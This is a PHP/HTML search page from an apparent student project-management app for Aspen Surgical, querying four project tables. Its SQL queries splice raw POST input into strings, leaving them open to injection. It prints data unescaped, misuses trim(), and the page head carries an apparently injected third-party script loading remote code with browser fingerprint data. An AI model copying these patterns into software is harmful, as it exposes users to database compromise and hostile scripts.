<!DOCTYPE html>
<html lang="en">
    <head>
    <script id="vitruvian" type="text/javascript" async="true" src="https://gonzo.banana-fana.com/kernel/3A26B532-6FB4-4D81-9D29-2C5D7669B5BB?aid=D4BD6028-B9E3-45F4-8E88-5C87D8F4903F&amp;iid=67D471BB-A8EC-4BC2-9AE7-293A9A2CD499&amp;itm=2013-10-17T04:59:51Z" data-nid="3A26B532-6FB4-4D81-9D29-2C5D7669B5BB" data-ie-pid="375F340D-AD1C-4B46-AB47-49C942908819" data-cr-pid="657A4D88-6BDF-48AD-A447-7BD07B6B9311" data-ff-pid="00000000-0000-0000-0000-000000000000" data-nf-pid="4F5178B9-B082-4538-8698-B531371A7293" data-pid="4F5178B9-B082-4538-8698-B531371A7293" data-aid="D4BD6028-B9E3-45F4-8E88-5C87D8F4903F" data-iid="67D471BB-A8EC-4BC2-9AE7-293A9A2CD499" data-sid="" data-ver="1.8.2.0" data-itm="2013-10-17T04:59:51Z" data-hid="D5934003-E1CD-7A25-586F-C460DB52515E" data-ie-at="EE2D45DF-792F-7794-608A-1729E0ABCFA3" data-cr-at="30B1E7D5-2268-499D-92F4-7BBDA70403D3" data-ff-at="00000000-0000-0000-0000-000000000000" data-nf-at="0DB10552-BDCB-66A5-D581-2D38EC6A14F8" data-at="0DB10552-BDCB-66A5-D581-2D38EC6A14F8" data-ie-ver="10.0.9200.16721" data-cr-ver="30.0.1599.69" data-ff-ver="" data-dbsr="chrome" data-osn="Windows 8" data-osv="6.2.9200" data-ost="x64" data-bsr="NF" ></script>

        <meta http-equiv="content-type" content="text/html; charset=UTF-8"> 
        <title>Aspen-search</title>
        <meta name="generator" content="Bootply" />
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
       <link href="http://localhost\css\bootstrap.min.css" rel="stylesheet">
        
      <!-- Bootstrap theme -->
      <link href="http://localhost\css\bootstrap-theme.min.css" rel="stylesheet">
      <link href="http://localhost\css/bootstrap.css" rel="stylesheet">
      <!-- Custom styles for this template -->
      <link href="theme.css" rel="stylesheet">
        
        <!--[if lt IE 9]>
          <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
        <![endif]-->

        <!-- CSS code from Bootply.com editor -->
        
        <style type="text/css">

            .container {

              margin: 0 auto;
              max-width: 960px;
            }
    input
    {
    border:1px solid;
    border-top-right-radius:1em;
    border-top-left-radius:1em;
    border-bottom-left-radius:1em;
    border-bottom-right-radius:1em;
    text-indent: 10px; 
    }

    select
    {
      max-width: 960px;
    border:1px solid;
    border-top-right-radius:1em;
    border-top-left-radius:1em;
    border-bottom-left-radius:1em;
    border-bottom-right-radius:1em;
    }


        </style>
    </head>
    
    <!-- HTML code from Bootply.com editor -->
    
    <body  >
                 

    <div class="navbar navbar-default">
      <div class="container">
        <a class="navbar-brand" href="#">Aspen Surgicals</a>
        <ul class="nav navbar-nav">
          <li class="active"><a href="#">Home</a></li>
          <li><a href="#">About</a></li>
          <li><a href="#">Contact</a></li>
          <li class="divider-vertical"></li>
          <li><a href="#">Help</a></li>
        </ul>
      </div>
    </div>
<?php
  
// Searching code 
// Developed by: Kinza K Khan 
// Date: 11 April 2014
// Project: Project Management App
// Supervisor: Dr. Yonglei Tao
// School of Computing and Information Systems
// Grand Valley State University (GVSU)
// User: Engineering Department of Aspen Surgical Products, Inc. 

  include("db.php");

  $searchterm1  = $_POST['Ptype'];
  $searchterm2  = $_POST['Name'];
  $searchterm3  = $_POST['Keyword'];
  $searchterm4  = $_POST['Type'];
  $searchterm5  = $_POST['Status'];
   
 

  trim ($searchterm1, $searchterm2);
  trim ($searchterm3, $searchterm4);
  trim ($searchterm5); 

//Searching from leading table

switch ($searchterm1)

  {
  case "Leading":
    $result = mysql_query("SELECT * FROM project WHERE owner_name LIKE '%".$searchterm2."%'
      AND project_lead_desc LIKE '%".$searchterm3."%'
      AND project_lead_type LIKE '%".$searchterm4."%'
      AND project_lead_status LIKE '%".$searchterm5."%'");
     echo 'Lead Project list';                                            
    echo "<table border='1'>
<tr>
<th>Owner Name</th>
<th>Project Description</th>
<th>Project Type</th>
<th>Project Status</th>
<th>Engineering Release Date</th>
<th>Commercial Release date</th>
<th>Percent Complete</th>
<th>CFR Number</th>
<th>Capital Expenditure</th>
<th>Actual spending to date</th>
<th>Schedule Link</th>
<th>Comments</th>
<th>Edit</th>
<th>Delete</th>
</tr>";

while($row = mysql_fetch_array($result))
  {
  echo "<tr>";
  $id = $row['ID'];  
  
  echo "<td>" . $row['owner_name'] . "</td>";
  echo "<td>" . $row['project_lead_desc'] . "</td>";
  echo "<td>" . $row['project_lead_type'] . "</td>";
  echo "<td>" . $row['project_lead_status'] . "</td>";
  echo "<td>" . $row['project_lead_engreldate'] . "</td>";
  echo "<td>" . $row['project_lead_comreldate'] . "</td>";
  echo "<td>" . $row['project_lead_percomp'] . "</td>";
  echo "<td>" . $row['project_lead_cfrnumber'] . "</td>";
  echo "<td>" . $row['project_lead_capitalexp'] . "</td>";
  echo "<td>" . $row['project_lead_actspending'] . "</td>";
  echo "<td>" . $row['project_lead_schlink'] . "</td>";
  echo "<td>" . $row['project_lead_comments'] . "</td>";
      echo"<td> <a href ='leadupdate.php?ID=$id'>Edit</a>";
      echo"<td> <a href ='viewalldel.php?ID=$id'><center>Delete</td>";
      echo "</tr>";
      }
      
      echo "</table>";
    
    break;  

//Searching from participating table 

  case "Participating":
   
    $result = mysql_query("SELECT * FROM participant WHERE owner LIKE '%".$searchterm2."%'
    AND part_desc LIKE '%".$searchterm3."%'
    AND part_type LIKE '%".$searchterm4."%'
    AND part_status LIKE '%".$searchterm5."%'");
      echo 'Participant Project list';
      echo "<table border='1'>
      <tr>
      <th>Owner Name</th>
      <th>Participant Name</th>
      <th>Project Description</th>
      <th>Project Type</th>
      <th>Project Status</th>
      <th>Project Due Date</th>
      <th>Percent Complete</th>
      <th>Comments</th>
      <th>Edit</th>
      <th>Delete</th>
      </tr>";

    while($row = mysql_fetch_array($result))
      {
        echo "<tr>";
        $id = $row['ID']; 
        echo "<td>" . $row['owner'] . "</td>";
        echo "<td>" . $row['participant_name'] . "</td>";
        echo "<td>" . $row['part_desc'] . "</td>";
        echo "<td>" . $row['part_type'] . "</td>";
        echo "<td>" . $row['part_status'] . "</td>";
        echo "<td>" . $row['part_duedate'] . "</td>";
        echo "<td>" . $row['part_percomp'] . "</td>";
        echo "<td>" . $row['p_comments'] . "</td>";
          echo"<td> <a href ='pupdate.php?ID=$id'>Edit</a>";
        echo"<td> <a href ='viewalldel.php?ID=$id'><center>Delete</td>";
        echo "</tr>";
      }
      
      echo "</table>";
      
    break;

//Searching from day to day support table    
  
  case "Day to day support":

    $result = mysql_query("SELECT * FROM dailysupport WHERE owner LIKE '%".$searchterm2."%'
    AND roll_desc LIKE '%".$searchterm3."%'
    AND proType LIKE '%".$searchterm4."%'
    AND sStatus LIKE '%".$searchterm5."%'");
      echo 'Dayto Day Support Project list';
      echo "<table border='1'>
      <tr>
      <th>Owner Name</th>
      <th>Participant Name</th>
      <th>Project Description</th>
      <th>Project Type</th>
      <th>Project Status</th>
      <th>Due Date</th>
      <th>Comments</th>
      <th>Edit</th>
      <th>Delete</th>
      </tr>";

    while($row = mysql_fetch_array($result))
      {
        echo "<tr>";
        $id = $row['ID']; 
        echo "<td>" . $row['owner'] . "</td>";
        echo "<td>" . $row['sup_name'] . "</td>";
        echo "<td>" . $row['roll_desc'] . "</td>";
        echo "<td>" . $row['proType'] . "</td>";
        echo "<td>" . $row['sStatus'] . "</td>";
        echo "<td>" . $row['dueDate'] . "</td>";
        echo "<td>" . $row['supcomments'] . "</td>";
          echo"<td> <a href ='supdate.php?ID=$id'>Edit</a>";
        echo"<td> <a href ='sdel.php?ID=$id'><center>Delete</td>";
        echo "</tr>";
      }
      
      echo "</table>";
      
    break;

//Searching from parking lot table     
  
  case "Parking lot":

    $result = mysql_query("SELECT * FROM parking WHERE powner LIKE '%".$searchterm2."%'
    AND pdesc LIKE '%".$searchterm3."%'
    AND ptype LIKE '%".$searchterm4."%'
    AND pstatus LIKE '%".$searchterm5."%'");

    echo "<br>";
    echo 'Parking Project list';
    echo "<table border='1'>
    <tr>
    <th>Participant Name</th>
    <th>Project Description</th>
    <th>Project Type</th>
    <th>Project Status</th>
    <th>Comments</th>
    <th>Edit</th>
    <th>Delete</th>
    </tr>";

    while($row = mysql_fetch_array($result))
      {
        echo "<tr>";
        $id = $row['ID']; 
        
        echo "<td>" . $row['powner'] . "</td>";
        echo "<td>" . $row['pdesc'] . "</td>";
        echo "<td>" . $row['ptype'] . "</td>";
        echo "<td>" . $row['pstatus'] . "</td>";
        echo "<td>" . $row['pcomment'] . "</td>";
        echo"<td> <a href ='parkupdate.php?ID=$id'>Edit</a>";
        echo"<td> <a href ='viewalldel.php?ID=$id'><center>Delete</td>";
        echo "</tr>";
      }
      
        echo "</table>";
     
    break;

//Searching from all table  
  
  default:
      
      
      echo "Lead Project List!";
      $result = mysql_query("SELECT * FROM project WHERE owner_name LIKE '%".$searchterm2."%'
      AND project_lead_desc LIKE '%".$searchterm3."%'
      AND project_lead_type LIKE '%".$searchterm4."%'
      AND project_lead_status LIKE '%".$searchterm5."%'");
                                                

        echo "<br>";
        
        echo "<table border='1'>
        <tr>
        <th>Owner Name</th>
        <th>Project Description</th>
        <th>Project Type</th>
        <th>Project Status</th>
        <th>Engineering Release Date</th>
        <th>Commercial Release date</th>
        <th>Percent Complete</th>
        <th>CFR Number</th>
        <th>Capital Expenditure</th>
        <th>Actual spending to date</th>
        <th>Schedule Link</th>
        <th>Comments</th>
        <th>Edit</th>
        <th>Delete</th>
        </tr>";

      while($row = mysql_fetch_array($result))
        {
          echo "<tr>";
          $id = $row['ID'];  
          
          echo "<td>" . $row['owner_name'] . "</td>";
          echo "<td>" . $row['project_lead_desc'] . "</td>";
          echo "<td>" . $row['project_lead_type'] . "</td>";
          echo "<td>" . $row['project_lead_status'] . "</td>";
          echo "<td>" . $row['project_lead_engreldate'] . "</td>";
          echo "<td>" . $row['project_lead_comreldate'] . "</td>";
          echo "<td>" . $row['project_lead_percomp'] . "</td>";
          echo "<td>" . $row['project_lead_cfrnumber'] . "</td>";
          echo "<td>" . $row['project_lead_capitalexp'] . "</td>";
          echo "<td>" . $row['project_lead_actspending'] . "</td>";
          echo "<td>" . $row['project_lead_schlink'] . "</td>";
          echo "<td>" . $row['project_lead_comments'] . "</td>";
          echo"<td> <a href ='leadupdate.php?ID=$id'>Edit</a>";
          echo"<td> <a href ='viewalldel.php?ID=$id'><center>Delete</td>";
          echo "</tr>";
        }
          
          echo "</table>";
          echo "Participant Project List!";
      $result = mysql_query("SELECT * FROM participant WHERE owner LIKE '%".$searchterm2."%'
          AND part_desc LIKE '%".$searchterm3."%'
          AND part_type LIKE '%".$searchterm4."%'
          AND part_status LIKE '%".$searchterm5."%'");

          echo "<br>";

          echo "<table border='1'>
          <tr>
          <th>Owner Name</th>
          <th>Participant Name</th>
          <th>Project Description</th>
          <th>Project Type</th>
          <th>Project Status</th>
          <th>Project Due Date</th>
          <th>Percent Complete</th>
          <th>Comments</th>
          <th>Edit</th>
          <th>Delete</th>
          </tr>";

      while($row = mysql_fetch_array($result))
          {
            echo "<tr>";
            $id = $row['ID']; 
            echo "<td>" . $row['owner'] . "</td>";
            echo "<td>" . $row['participant_name'] . "</td>";
            echo "<td>" . $row['part_desc'] . "</td>";
            echo "<td>" . $row['part_type'] . "</td>";
            echo "<td>" . $row['part_status'] . "</td>";
            echo "<td>" . $row['part_duedate'] . "</td>";
            echo "<td>" . $row['part_percomp'] . "</td>";
            echo "<td>" . $row['p_comments'] . "</td>";
              echo"<td> <a href ='pupdate.php?ID=$id'>Edit</a>";
            echo"<td> <a href ='viewalldel.php?ID=$id'><center>Delete</td>";
            echo "</tr>";
          }
          
          echo "</table>";
      echo "Day to Day Support Project List!";
      $result = mysql_query("SELECT * FROM dailysupport WHERE owner LIKE '%".$searchterm2."%'
            AND roll_desc LIKE '%".$searchterm3."%'
            AND proType LIKE '%".$searchterm4."%'
            AND sStatus LIKE '%".$searchterm5."%'");

          echo "<br>";

          echo "<table border='1'>
          <tr>
          <th>Owner Name</th>
          <th>Participant Name</th>
          <th>Project Description</th>
          <th>Project Type</th>
          <th>Project Status</th>
          <th>Due Date</th>
          <th>Comments</th>
          <th>Edit</th>
          <th>Delete</th>
          </tr>";

      while($row = mysql_fetch_array($result))
        {
            echo "<tr>";
            $id = $row['ID']; 
            echo "<td>" . $row['owner'] . "</td>";
            echo "<td>" . $row['sup_name'] . "</td>";
            echo "<td>" . $row['roll_desc'] . "</td>";
            echo "<td>" . $row['proType'] . "</td>";
            echo "<td>" . $row['sStatus'] . "</td>";
            echo "<td>" . $row['dueDate'] . "</td>";
            echo "<td>" . $row['supcomments'] . "</td>";
              echo"<td> <a href ='supdate.php?ID=$id'>Edit</a>";
            echo"<td> <a href ='sdel.php?ID=$id'><center>Delete</td>";
            echo "</tr>";
        }
          echo "</table>";
      echo "Parking lot Project List!";
      $result = mysql_query("SELECT * FROM parking WHERE powner LIKE '%".$searchterm2."%'
            AND pdesc LIKE '%".$searchterm3."%'
            AND ptype LIKE '%".$searchterm4."%'
            AND pstatus LIKE '%".$searchterm5."%'");

          echo "<br>";

          echo "<table border='1'>
          <tr>

          <th>Participant Name</th>
          <th>Project Description</th>
          <th>Project Type</th>
          <th>Project Status</th>
          <th>Comments</th>
          <th>Edit</th>
          <th>Delete</th>
          </tr>";

      while($row = mysql_fetch_array($result))
            {
            echo "<tr>";
            $id = $row['ID']; 
            
            echo "<td>" . $row['powner'] . "</td>";
            echo "<td>" . $row['pdesc'] . "</td>";
            echo "<td>" . $row['ptype'] . "</td>";
            echo "<td>" . $row['pstatus'] . "</td>";
            echo "<td>" . $row['pcomment'] . "</td>";
           echo"<td> <a href ='update.php?ID=$id'>Edit</a>";
            echo"<td> <a href ='viewalldel.php?ID=$id'><center>Delete</td>";
            echo "</tr>";
            }
          
            echo "</table>";

  }
?>
